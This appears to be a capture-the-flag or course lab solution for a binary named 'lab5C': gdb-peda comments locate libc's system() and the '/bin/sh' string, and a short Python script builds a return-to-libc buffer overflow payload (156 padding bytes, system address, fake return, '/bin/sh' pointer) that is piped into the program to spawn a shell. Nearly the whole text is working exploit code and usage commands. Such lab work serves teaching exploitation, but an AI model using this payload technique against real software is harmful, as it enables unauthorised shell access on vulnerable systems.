
# gdb-peda$ p system
# $1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>

# gdb-peda$ find /bin/sh
# Searching for '/bin/sh' in: None ranges
# Found 1 results, display max 1 items:
# libc : 0xb7f83a24 ("/bin/sh")

# payload = buffer + system + fake_ret + /bin/sh

# $(python -c 'print "A"*156 + "\x90\x31\xe6\xb7"+ "JUNK" + "\x24\x3a\xf8\xb7"'; cat;) | ./lab5C


def re_(x):
    import struct
    return struct.pack("<I",x)
payload = "A" * 156
payload += re_(0xb7e63190)
payload += "JUNK"
payload += re_(0xb7f83a24)
print(payload)

# $(python /tmp/sol.py; cat;) | ./lab5C
